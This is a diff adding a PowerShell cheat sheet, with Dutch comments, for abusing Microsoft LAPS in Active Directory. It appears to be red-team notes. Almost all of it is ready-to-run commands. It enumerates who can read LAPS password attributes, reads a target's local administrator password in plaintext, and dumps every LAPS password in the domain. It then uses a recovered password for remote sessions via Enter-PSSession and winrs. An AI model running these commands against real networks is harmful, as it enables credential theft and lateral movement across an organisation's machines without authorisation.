@@ -1,0 +1,45 @@
+# LAPS — Local Administrator Password Solution
+# Lees het lokale admin wachtwoord van machines met LAPS, en enumereer wie leesrechten heeft
+
+# === Enumeratie: wie heeft LAPS leesrechten? ===
+
+# PowerView: vind wie ms-Mcs-AdmPwd mag lezen
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | select IdentityName,ActiveDirectoryRights
+
+# === Legacy LAPS (ms-mcs-admpwd) ===
+
+# AD Module
+Get-ADComputer -Identity TARGET -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+
+# PowerView
+Get-DomainObject -Identity TARGET | select -ExpandProperty ms-mcs-admpwd
+
+# === Windows LAPS (msLAPS-Password) ===
+
+# LAPS Module (Windows Server 2019+)
+Get-LapsADPassword -Identity TARGET -AsPlainText
+
+# AD Module (Windows LAPS attribuut)
+Get-ADComputer -Identity TARGET -Properties msLAPS-Password | select -ExpandProperty msLAPS-Password
+
+# === Alle LAPS wachtwoorden dumpen (als je Domain Admin bent) ===
+
+# PowerView
+Get-DomainComputer | ? {$_.'ms-mcs-admpwd'} | select dnsHostName,ms-mcs-admpwd
+
+# AD Module
+Get-ADComputer -Filter * -Properties ms-mcs-admpwd | ? {$_.'ms-mcs-admpwd'} | select Name,ms-mcs-admpwd
+
+# === Gebruik ===
+
+# PSRemoting met het LAPS wachtwoord
+$passwd = ConvertTo-SecureString 'LAPS_WACHTWOORD' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("TARGET\Administrator", $passwd)
+Enter-PSSession -ComputerName TARGET -Credential $creds
+
+# WinRM
+winrs -r:TARGET -u:TARGET\Administrator -p:LAPS_WACHTWOORD cmd
+
+# Noot: Legacy LAPS attribuut: ms-mcs-admpwd
+# Noot: Windows LAPS attribuut: msLAPS-Password (nieuwere versie)
+# Noot: LAPS wachtwoorden roteren automatisch volgens GPO policy
